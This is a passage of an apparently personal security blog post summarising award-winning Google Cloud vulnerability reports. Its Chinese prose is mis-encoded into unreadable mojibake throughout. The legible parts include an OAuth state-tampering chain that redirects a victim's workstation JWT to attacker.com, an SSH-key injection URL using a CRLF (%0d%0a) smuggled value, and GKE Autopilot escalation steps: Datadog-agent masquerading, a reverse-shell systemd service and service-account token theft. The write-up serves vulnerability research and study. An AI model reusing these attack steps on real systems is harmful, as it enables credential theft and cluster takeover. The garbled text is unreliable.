<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428288.png" alt="image-20230627142855242"></p>
<h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-3"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-3" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>è¿™ä¸ªæ¼æ´æ˜¯æˆ‘è®¤ä¸ºbypassæœ€ä¸ºç²¾å¦™çš„ä¸€ä¸ªï¼Œå­¦åˆ°çš„æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<p>1.tornadoçš„csrfæ ¡éªŒbypass feature</p>
<p>2.å½“å‚å•†åœ¨SSRFç‚¹é™åˆ¶äº†è‡ªå·±çš„æ ¹åŸŸååï¼Œå¯ä»¥è€ƒè™‘ä»å­åŸŸçš„ä¸šåŠ¡ç‚¹å…¥æ‰‹æŒ–æ˜ä¸€ä¸ªOpenRedirectï¼Œåœ¨æ”¯æŒ302è·³è½¬çš„æƒ…å†µä¸‹å¾€å¾€ä¼šäº§ç”Ÿæ„æƒ³ä¸åˆ°çš„æ•ˆæœ</p>
<h2 id="3rd-Prize-Bypassing-Authorization-in-Cloud-Workstations-31337"><a href="#3rd-Prize-Bypassing-Authorization-in-Cloud-Workstations-31337" class="headerlink" title="3rd Prize: Bypassing Authorization in Cloud Workstations - $31337"></a>3rd Prize: Bypassing Authorization in Cloud Workstations - $31337</h2><p>è¿™ä¸ªæ¼æ´æ¯”è¾ƒéº»çƒ¦ï¼Œæ˜¯ä¸€ä¸ªOuthå±‚é¢çš„æ¼æ´ï¼ŒOuthä¸­ç»å…¸çš„å¾€å¾€æ˜¯æ§åˆ¶redirect urlå®ç°å‡­æ®åŠ«æŒ</p>
<p>ä½†æ˜¯è¿™ä¸ªç‚¹ç¨å¾®å¤šäº†ç‚¹æ­¥éª¤ï¼Œè¦å…ˆè·å–åˆ°å—å®³è€…outhçš„urlå†è¿›è¡Œæ„é€ æ‰èƒ½å®ç°å‡­æ®åŠ«æŒï¼Œå› æ­¤ç›´æ¥ç»™å‡ºä½œè€…çš„Attack Chainä¾›å¤§å®¶å‚è€ƒ</p>
<blockquote>
<ol>
<li><p><strong>è®¿é—®{victim-subdomain}.cloudworkstations.dev</strong></p>
</li>
<li><p><strong>è¢«é‡å®šå‘åˆ°å¹¶ç»™å‡º 500 å“åº”<code>https://ssh.cloud.google.com/devshell/oauth?authuser=0&amp;state=&#123;state-value&#125;</code></strong></p>
</li>
<li><p><strong>stateå‚æ•°ä¸ºbase64åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ•°æ®å®ä¾‹å¦‚ä¸‹</strong></p>
<pre><code class="json">&#123;&quot;token&quot;:&quot;random-token&quot;,&quot;target_host&quot;:&quot;attacker.com/80-&#123;workstation-name&#125;.cluster-&#123;random-string&#125;.cloudworkstations.dev&quot;,&quot;authuser&quot;:&quot;&quot;,&quot;workstation_name&quot;:&quot;projects/project-name-374312/locations/us-central1/workstationClusters/cluster-name/workstationConfigs/config-name/workstations/workstation-name&quot;,&quot;workstation_consumer_project_number&quot;:&quot;0123456789&quot;&#125;
</code></pre>
<p><strong>ä»base64è§£ç çŠ¶æ€å‚æ•°ï¼Œå¹¶å°†target_hostå€¼æ›´æ”¹ä¸º<code>attacker.com/&#123;victim-subdomain&#125;.cloudworkstations.dev</code></strong></p>
</li>
<li><p><strong>å°† JSON é‡æ–°ç¼–ç ä¸º base64 å¹¶åˆ›å»ºæ–°çš„çŠ¶æ€å€¼</strong></p>
</li>
<li><p><strong>ä½¿ç”¨ä¿®æ”¹åçš„çŠ¶æ€å€¼åˆ¶ä½œ OAuth URL -å¹¶å°†æ¶æ„é“¾æ¥å‘é€ç»™å—å®³è€…<code>https://ssh.cloud.google.com/devshell/oauth?authuser=0&amp;state=&#123;malicious-state-value&#125;</code></strong></p>
</li>
<li><p><strong>ä¸€æ—¦å—å®³è€…æ‰“å¼€æ¶æ„é“¾æ¥ï¼Œæ”»å‡»è€…å°±ä¼šæ”¶åˆ°å¯¹å…¶æœåŠ¡å™¨çš„ GET è¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†å…·æœ‰ workstation_jwt å€¼ã€‚</strong></p>
</li>
<li><p><strong>ç„¶åï¼Œæ”»å‡»è€…ä½¿ç”¨å—å®³è€…çš„å‡­æ®å¹¶è®¿é—®å—å®³è€…çš„å·¥ä½œç«™<code>https://&#123;victim-subdomain&#125;.cloudworkstations.dev/_workstation/login?redirect=&#123;state-value&#125;&amp;workstation_jwt=&#123;victim-jwt-value&#125;</code></strong></p>
</li>
</ol>
</blockquote>
<h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-4"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-4" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.å¤šå¤šç•™æ„ä¸€äº›å¼±åŠ å¯†çš„å‚æ•°å€¼ï¼Œå¾€å¾€éšè—ç€ä¸ä¸ºäººçŸ¥çš„ç§˜å¯†</p>
<p>2.Outhæ¼æ´ä¸­openRedirectå¯¼è‡´çš„å‡­æ®åŠ«æŒä¸ä¸€å®šå°±æ˜¯å†™è„¸ä¸Šçš„redirectUrlå¯æ§~å°½é‡å»å‘æ˜å¯æ§çš„redirectå‚æ•°ç‚¹ï¼Œé’ˆå¯¹å®æˆ˜æƒ…å†µå†è¿›è¡Œbypass</p>
<h2 id="2nd-Prize-SSH-Key-Injection-on-GCE-73-331"><a href="#2nd-Prize-SSH-Key-Injection-on-GCE-73-331" class="headerlink" title="2nd Prize: SSH Key Injection on GCE - $73,331"></a><strong>2nd Prize: SSH Key Injection on GCE -</strong> $73,331</h2><p>æ¼æ´å‘æ˜è€…åœ¨google cloudçš„<em>Google</em> Compute Engineï¼ˆGCEï¼‰çš„instanceæ·»åŠ SSH Keyæ—¶ï¼Œä½¿ç”¨äº†å½¢å¦‚</p>
<pre><code>curl https://stazot.com
</code></pre>
<p>çš„payload</p>
<p>ä½†æ˜¯å´å‡ºç°äº†å¦‚ä¸‹å›¾æ‰€ç¤ºçš„å¥‡è‘©è¾“å‡º</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280909736.png" alt="img"></p>
<p>æ¼æ´å‘æ˜è€…ç¬é—´å¤©çµç›–ç‚¸å¼€ï¼ŒåŸæ¥å†’å·:ä¼šè¢«å½“æˆè¿™ä¸ªç‚¹çš„åˆ†éš”ç¬¦å·ã€‚</p>
<p>å†’å·å‰çš„ä½œä¸ºusernameï¼Œå†’å·åä½œä¸ºssh keyï¼Œå¹¶ä¸”è¿™ä¸€åˆ‡éƒ½æ˜¯é€šè¿‡getæ–¹å¼è¿›è¡Œä¼ å‚çš„</p>
<p>å› æ­¤ï¼Œæ¼æ´å‘æ˜è€…å‡†å¤‡æ„é€ URLï¼Œè®©å—å®³è€…æ‰“å¼€æ¶æ„é“¾æ¥ä¼šå°†æ”»å‡»è€…çš„ç”¨æˆ·åå’Œ SSH å¯†é’¥æ·»åŠ åˆ°ä»–ä»¬çš„è®¡ç®—å®ä¾‹ä¸­ã€‚</p>
<p>ä»¥ä¸‹ URL attacker:{URL-ENCODED-SSH-PUBLIC-KEY} ä½œä¸ºExploitå¤„ï¼š</p>
<pre><code>https://ssh.cloud.google.com/v2/ssh/projects/&#123;PROJECT-NAME&#125;/zones/&#123;INSTANCE-ZONE&#125;/instances/&#123;INSTANCE-NAME&#125;?newLinuxUsername=attacker:&#123;URL-ENCODED-SSH-PUBLIC-KEY&#125;
</code></pre>
<p>ä»¥å—å®³è€…èº«ä»½æ‰“å¼€é“¾æ¥ - ä½†æ˜¯ï¼Œå®ƒæ²¡æœ‰å¥æ•ˆã€‚</p>
<p>åŸå› æ˜¯æ·»åŠ çš„SSHå¯†é’¥éšåé™„åŠ äº†Googleåœ¨åç«¯è‡ªåŠ¨ç”Ÿæˆçš„SSHå¯†é’¥ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ¼æ´å‘æ˜è€…åœ¨æœ‰æ•ˆè´Ÿè½½åé™„åŠ äº†æ¢è¡Œç¬¦%0d%0aè¿”å›å­—ç¬¦ï¼š</p>
<pre><code>https://ssh.cloud.google.com/v2/ssh/projects/&#123;PROJECT-NAME&#125;/zones/&#123;INSTANCE-ZONE&#125;/instances/&#123;INSTANCE-NAME&#125;?newLinuxUsername=attacker:&#123;URL-ENCODED-SSH-PUBLIC-KEY&#125;%0d%0a
</code></pre>
<p>æˆåŠŸç»•è¿‡äº†é™åˆ¶</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280919652.png" alt="image-20230628091912594"></p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280922300.png" alt="image-20230628092202263"></p>
<p>è‡³æ­¤å®ç°äº†ä¸€ä¸ªå¥‡è‘©æƒ…å†µä¸‹äº§ç”Ÿå¥‡è¿¹çš„RCE</p>
<h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-5"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-5" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.æµ‹è¯•å…¬æœ‰äº‘å‚å•†æ—¶ï¼Œå¤šå¤šç•™æ„å¸¦æœ‰é«˜å±æ“ä½œçš„åŠŸèƒ½ç‚¹ï¼Œè¯¸å¦‚å®ä¾‹ç”¨æˆ·æ·»åŠ ï¼ŒSSH Keyæ·»åŠ çš„åŠŸèƒ½ç‚¹ï¼Œä¸€ä½†å‡ºæ´ï¼Œä¾¿æ˜¯æƒŠæ¶›éª‡æµª</p>
<p>2.åœ¨æŸäº›æƒ…å†µä¸‹å¯å°è¯•ä½¿ç”¨%0d%0aç­‰control charsæ¯™æ‰ç¨‹åºåç«¯è‡ªåŠ¨ç”Ÿæˆçš„å†…å®¹ï¼Œè®©æˆ‘ä»¬çš„æ¼æ´è§¦å‘ç‚¹æ„é€ ä¸åˆ©ç”¨æ›´åŠ ä¸€å¸†é£é¡º</p>
<h2 id="1st-Prize-Privilege-escalations-in-GKE-Autopilot-133-337"><a href="#1st-Prize-Privilege-escalations-in-GKE-Autopilot-133-337" class="headerlink" title="1st Prize: Privilege escalations in GKE Autopilot - $133,337"></a>1st Prize: Privilege escalations in GKE Autopilot - $133,337</h2><p>ç»ˆäºæ¥åˆ°äº†top1çš„vulnï¼ˆ<a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/%EF%BC%89">https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/ï¼‰</a></p>
<p>åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œæ¼æ´å‘æ˜è€…æŒ–æ˜äº†æ•°æ¡æ”»å‡»è·¯å¾„ï¼Œè¿™äº›è·¯å¾„å…è®¸æœ‰æƒåœ¨ Autopilot é›†ç¾¤ä¸­åˆ›å»º Pod çš„æ”»å‡»è€…æå‡æƒé™å¹¶ç ´ååº•å±‚èŠ‚ç‚¹è™šæ‹Ÿæœºã€‚</p>
<p>Autopilotæ¶æ„çš„ç®€åŒ–å›¾å¦‚å›¾ã€‚</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280950966.png" alt="A simplified diagram of Autopilot&#39;s architecture. Components unique to Autopilot are colored in green and shown with a number corresponding to their role from the list above. Unlike GKE Standard, where nodes are visible as Compute Engine VMs, Autopilot nodes are completely managed by Google, thus colored in green."></p>
<p>Autopilot ç‰¹æœ‰çš„ç»„ä»¶ä»¥ç»¿è‰²æ˜¾ç¤ºï¼Œå¹¶æ˜¾ç¤ºä¸ä¸Šé¢åˆ—è¡¨ä¸­çš„è§’è‰²å¯¹åº”çš„æ•°å­—ã€‚</p>
<p>ä¸ GKE Standard ä¸åŒï¼Œå…¶ä¸­èŠ‚ç‚¹æ˜¾ç¤ºä¸ºè®¡ç®—å¼•æ“è™šæ‹Ÿæœºï¼ŒAutopilot èŠ‚ç‚¹å®Œå…¨ç”± Google ç®¡ç†ï¼Œå› æ­¤æ˜¾ç¤ºä¸ºç»¿è‰²ã€‚</p>
<p>Autopilotå†…ç½®äº†å®‰å…¨ç­–ç•¥é˜²æ­¢è¿è¡ŒPrivileged Containerï¼ŒåŒæ—¶é˜»æ­¢ç”¨æˆ·è®¿é—®ç”± Google ç®¡ç†çš„ç¾¤é›†ç»„ä»¶ï¼ˆå¦‚èŠ‚ç‚¹ï¼‰; é˜²æ­¢ç”¨æˆ·è®¿é—®ç”± Google ç®¡ç†çš„ç¾¤é›†ç»„ä»¶ï¼ˆå¦‚èŠ‚ç‚¹ï¼‰ï¼Œä»¥é˜²æ­¢å®¹å™¨é€ƒé€¸å’Œå…¶ä»–æ”»å‡»é¢</p>
<p>å¦‚ä½œè€…ç»™å‡ºçš„å›¾æ‰€ç¤º</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280955294.png" alt="image-20230628095555233"></p>
<p>ä½†æ˜¯ä½œè€…ä¾ç„¶ç»™å‡ºäº†ä¸€äº›å¯èƒ½çš„æ”»å‡»é¢</p>
<ol>
<li><p>GoogleCloudä¾é  Autopilot çš„ç­–ç•¥æ¥é˜²æ­¢æœ‰é£é™©çš„é…ç½®ã€‚</p>
<p>å¦‚æœæ”»å‡»è€…å¯ä»¥ä»¥æŸç§æ–¹å¼ç»•è¿‡è¯¥ç­–ç•¥ï¼Œä»–ä»¬å¯èƒ½ä¼šé€šè¿‡å®¢æˆ·æœŸæœ›è¢«é˜»æ­¢çš„æ–¹æ³•ï¼ˆä¾‹å¦‚éƒ¨ç½²ç‰¹æƒå®¹å™¨ï¼‰æ¥æå‡æƒé™ã€‚</p>
</li>
<li><p>Autopilot ç®¡ç†å‘˜æ²¡æœ‰å®Œå…¨ç‰¹æƒï¼Œå—å†…ç½®ç­–ç•¥çš„é™åˆ¶ï¼Œæ— æ³•è®¿é—®èŠ‚ç‚¹å’ŒæŸäº›ç‰¹æƒ Kubernetes APIã€‚</p>
<p>å¦‚æœæ”»å‡»è€…å¯ä»¥ç»•è¿‡Autopilotçš„ç­–ç•¥ï¼Œä»–ä»¬å¯èƒ½ä¼šè·å¾—æ¯”ç®¡ç†å‘˜æ›´é«˜çš„æƒé™ï¼Œä»è€Œä¸ºéšå½¢åé—¨æ‰“å¼€å¤§é—¨ã€‚</p>
</li>
</ol>
<h3 id="ç¬¬ä¸€æ¡æ”»å‡»é“¾"><a href="#ç¬¬ä¸€æ¡æ”»å‡»é“¾" class="headerlink" title="ç¬¬ä¸€æ¡æ”»å‡»é“¾"></a>ç¬¬ä¸€æ¡æ”»å‡»é“¾</h3><p>Autopilot ç¦æ­¢å¯èƒ½å…è®¸å®¹å™¨é€ƒé€¸çš„ Pod é…ç½®ã€‚ä¸ºäº†æ”¯æŒä¸€äº›ç‰¹æ®Šçš„nodeè®¿é—®çš„é™„åŠ ç»„ä»¶ï¼ŒAutopilot åˆ›å»ºäº†ä¸€ä¸ªå…è®¸åˆ—è¡¨workloadsçš„æ¦‚å¿µã€‚å¦‚æœå®¹å™¨ä¸å…è®¸åˆ—å‡ºçš„workloadsåŒ¹é…ï¼Œåˆ™å…è®¸å®ƒä½¿ç”¨å…è®¸åˆ—è¡¨å·¥ä½œè´Ÿè½½é…ç½®ä¸­æŒ‡å®šçš„ç‰¹æƒåŠŸèƒ½ã€‚æ¼æ´æŒ–æ˜è€…æµ‹è¯•æ—¶ï¼Œå”¯ä¸€åˆ—å…¥å…è®¸åˆ—è¡¨çš„workloadsæ˜¯ Datadog agent</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281001176.png" alt="In June, the only allow-listed workloads were Datadog agents."></p>
<p>ä¸‹é¢æ˜¯å¼•èµ·æ¼æ´å‘æ˜è€…æ³¨æ„çš„å…¶ä¸­ä¸€ä¸ª Datadog agentçš„allowListedworkLoadsé…ç½®ã€‚å¦‚æœå®¹å™¨æŒ‡å®šäº†åˆ—å‡ºçš„å‘½ä»¤å’Œæ˜ åƒï¼Œåˆ™å…è®¸å®ƒåœ¨åªè¯»å·ä¸­è£…è½½åˆ—å‡ºçš„ä¸»æœºè·¯å¾„ã€‚</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281003231.png" alt="The screenshot shows the allow-listed workload configuration for one of the Datadog agents that caught our attention while searching for GKE Autopilot vulnerabilities. "></p>
<p>è¿™é‡Œçš„å®‰å…¨é—®é¢˜æ˜¯æ ¡éªŒä¸å……åˆ†ã€‚ä»…æ£€æŸ¥å‘½ä»¤å’Œæ˜ åƒä¸è¶³ä»¥ç¡®ä¿å®¹å™¨è¿è¡Œ Datadog ä»£ç ã€‚</p>
<p>ä½¿ç”¨ä»¥ä¸‹ PodSpecï¼Œå®¹å™¨å¯ä»¥åœ¨è¿è¡Œæ”»å‡»è€…æ§åˆ¶çš„ä»£ç æ—¶ä¼ªè£…æˆ Datadog agentï¼Œå¹¶æ»¥ç”¨æš´éœ²çš„ä¸»æœºå·è¿›è¡Œç ´åã€‚</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281006198.png" alt="Using the PodSpec shown here, a container can masquerade as the Datadog agent while running attacker-controlled code, and abuse the exposed host volumes to break out."></p>
<p>åœ¨ä¸‹é¢ä½œè€…ç»™å‡ºçš„è§†é¢‘ä¸­ï¼Œæ¶æ„ç”¨æˆ·éƒ¨ç½²äº†ä¸€ä¸ªä¼ªè£…æˆ Datadog ä»£ç†çš„å®¹å™¨ã€‚Pod é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥ç®¡å…¶åº•å±‚èŠ‚ç‚¹ï¼š</p>
<ol>
<li>æ»¥ç”¨æŒ‚è½½çš„ containerd socketæ¥åˆ›å»ºæŒ‚è½½ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„ç‰¹æƒå®¹å™¨ã€‚</li>
<li>è®©è¯¥ç‰¹æƒå®¹å™¨å®‰è£…ä¸€ä¸ª systemd æœåŠ¡ï¼Œè¯¥æœåŠ¡ä¼šè®©nodeæ´¾ç”Ÿä¸€ä¸ªåå‘shellç»™æ”»å‡»è€…</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://youtu.be/0cZJklJxTQk">https://youtu.be/0cZJklJxTQk</a></p>
<h3 id="ç¬¬äºŒæ¡æ”»å‡»é“¾"><a href="#ç¬¬äºŒæ¡æ”»å‡»é“¾" class="headerlink" title="ç¬¬äºŒæ¡æ”»å‡»é“¾"></a>ç¬¬äºŒæ¡æ”»å‡»é“¾</h3><p>ç¬¬äºŒæ¡æ”»å‡»è·¯å¾„æ¶‰åŠçš„æ¦‚å¿µè¾ƒå¤š</p>
<p>ç®€è€Œè¨€ä¹‹çš„è¯ï¼Œæ¼æ´å‘æ˜è€…å¼€å‘äº†ä¸€ä¸ª Python å·¥å…·ï¼Œå¯å°† Pod çš„æœåŠ¡å¸æˆ·æ˜ å°„åˆ°å®ƒä»¬çš„ Kubernetes æƒé™ï¼ˆå³è§’è‰²å’Œé›†ç¾¤è§’è‰²ï¼‰åä¸ºsa-hunter ã€‚</p>
<p>é€šè¿‡è¯¥å·¥å…·ï¼Œæ¼æ´æŒ–æ˜è€…å‘ç°é»˜è®¤å®‰è£…äº†ä¸¤ä¸ªåŠŸèƒ½å¼ºå¤§çš„ kube-system podï¼š<strong>stackdriver-metadata-agent-cluster-level</strong> <strong>å’Œ metrics-server</strong>ã€‚ä¸¤ä¸ª Pod éƒ½å¯ä»¥æ›´æ–°ç°æœ‰éƒ¨ç½²ã€‚</p>
<p>ä¹ä¸€çœ‹ï¼Œæ­¤æƒé™å¯èƒ½çœ‹èµ·æ¥æ˜¯æ— è¾œçš„ï¼Œä½†è¶³ä»¥æƒé™æå‡åˆ°cluster adminã€‚åŒæ—¶è¿™äº› Pod ä¹Ÿé»˜è®¤éƒ¨ç½²åœ¨GKE Standardä¸­ï¼Œè¿™ä½¿å¾—ä»¥ä¸‹æƒé™æå‡æŠ€æœ¯ä¸æ‰€æœ‰ GKE é›†ç¾¤ï¼ˆ<strong>GKE clusters, Standard and Autopilot</strong>ï¼‰ç›¸å…³ã€‚</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281013990.png" alt="Privileged role assigned to the metrics-server pod can update deployments."></p>
<p>åç»­è·å–å¹¶æ”»å‡»æœåŠ¡è´¦æˆ·tokençš„æ”»å‡»è·¯å¾„ä½œè€…åŸæ–‡æè¿°å¦‚ä¸‹</p>
<blockquote>
<p>After taking over a node hosting either the stackdriver-metadata-agent-cluster-level or metrics-server pod, an attacker can harvest their service account token from the node filesystem. Armed with that token, the attacker can attain the privileges of any service account in the cluster with three simple steps:</p>
<ol>
<li><p>Update an existing deploymentâ€™s service account to the target service account. There are a number of preinstalled deployments, any one of which can be used for this step.</p>
</li>
<li><p>Add a malicious container to that deployment.</p>
</li>
<li><p>Have that malicious container retrieve the target service account token mounted in the container at &#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token.</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281018381.png" alt="Abusing deployment update privileges to obtain any service account&#39;s token."></p>
</li>
</ol>
</blockquote>
<p>kube-system namespaceæä¾›äº†è®¸å¤šé¢„å®‰è£…çš„ã€åŠŸèƒ½æå…¶å¼ºå¤§çš„æœåŠ¡å¸æˆ·å¯é€‰æ‹©ã€‚clusterrole-aggregation-controller (CRACï¼‰ æœåŠ¡å¸æˆ·å¯èƒ½æ˜¯ä¸»è¦å€™é€‰å¸æˆ·ï¼Œå› ä¸ºå®ƒå¯ä»¥å‘ç°æœ‰ç¾¤é›†è§’è‰²æ·»åŠ ä»»æ„æƒé™ã€‚</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281020487.png" alt="The clusterrole-aggregation-controller service account can escalate cluster roles."></p>
<p>è·å– CRAC ä»¤ç‰Œåï¼Œæ”»å‡»è€…å¯ä»¥æ›´æ–°ç»‘å®šåˆ° CRAC çš„é›†ç¾¤è§’è‰²ä»¥æ‹¥æœ‰æ‰€æœ‰æƒé™ã€‚æ­¤æ—¶ï¼Œæ”»å‡»è€…å®é™…ä¸Šæ˜¯é›†ç¾¤ç®¡ç†å‘˜ï¼Œå¹¶ä¸”ä¸å— Autopilot ç­–ç•¥çš„çº¦æŸ</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281022460.png" alt="image-20230628102225402"></p>
<p>ä½œè€…ç»™å‡ºçš„POCè§†é¢‘å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://youtu.be/4Dddhk1QclY">https://youtu.be/4Dddhk1QclY</a></p>
<h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-6"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-6" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.æµ‹è¯•é›†ç¾¤æœåŠ¡æ—¶ï¼Œå¤šå¤šå…³æ³¨é›†ç¾¤æœåŠ¡ä¸­å…è®¸ä»¥ç‰¹æƒæ¨¡å¼è¿è¡Œçš„POD</p>
<p>2.å¤šå¤šç•™æ„é›†ç¾¤æœåŠ¡ä¸­preinstalled serviceçš„æƒé™è¯¯é…</p>
<h2 id="åè¨€ï¼š"><a href="#åè¨€ï¼š" class="headerlink" title="åè¨€ï¼š"></a>åè¨€ï¼š</h2><p>é€šè¿‡ä»¥ä¸Šä¸ƒä¸ªç²¾å¦™çš„æ¼æ´çš„å­¦ä¹ ä¸æ€è€ƒæ€»ç»“ï¼Œä¸ç”±å¾—æ…¨å¹ï¼šè€å¤–é¡¶çº§çš„æ¼æ´æŒ–æ˜è€…åŠŸåº•ä¹‹æ‰å®ï¼Œæ€è·¯ä¹‹é£éªšï¼Œæˆ‘ä»¬è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°</p>
<p>åšé‡‡å¤©ä¸‹ä¼—é•¿ï¼Œæ”˜å¤©ä¸‹ä¹‹å­¦è¯†ä¸ºæˆ‘æ‰€ç”¨â€”â€”æ˜¯æ–°æ—¶ä»£ä¼˜ç§€hackerä¸geekerçš„èƒ½åŠ›æ ‡é…</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/12/01/%E6%9F%90%E5%A4%B4%E9%83%A8%E7%9B%B4%E8%BE%96%E5%B8%82%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%BA%AA%E5%AE%9E-%E5%A6%82%E4%BD%95%E4%B8%8D%E7%94%A80day%E6%89%93%E4%B8%8Bn%E4%B8%AA%E7%82%B9/" title="æŸå¤´éƒ¨ç›´è¾–å¸‚æ”»é˜²æ¼”ç»ƒçºªå®-å¦‚ä½•ä¸ç”¨0dayæ‰“ä¸‹nä¸ªç‚¹"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">ä¸Šä¸€é¡µ: æŸå¤´éƒ¨ç›´è¾–å¸‚æ”»é˜²æ¼”ç»ƒçºªå®-å¦‚ä½•ä¸ç”¨0dayæ‰“ä¸‹nä¸ªç‚¹</span></a><a class="button is-default" href="/2023/04/24/Mac-M1-Ventura%E8%A7%A3%E5%86%B3ProxyChains-ng%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5/" title="Mac M1 Venturaè§£å†³ProxyChains-ngæ— æ³•æ­£å¸¸ä½¿ç”¨"><span class="has-text-weight-semibold">ä¸‹ä¸€é¡µ: Mac M1 Venturaè§£å†³ProxyChains-ngæ— æ³•æ­£å¸¸ä½¿ç”¨</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="j0o1ey/j0o1ey.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/j0o1ey"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- çŸ¥ä¹--><!-- é¢†è‹±--><!-- è„¸ä¹¦--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright Â©</span><span> J0o1ey 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>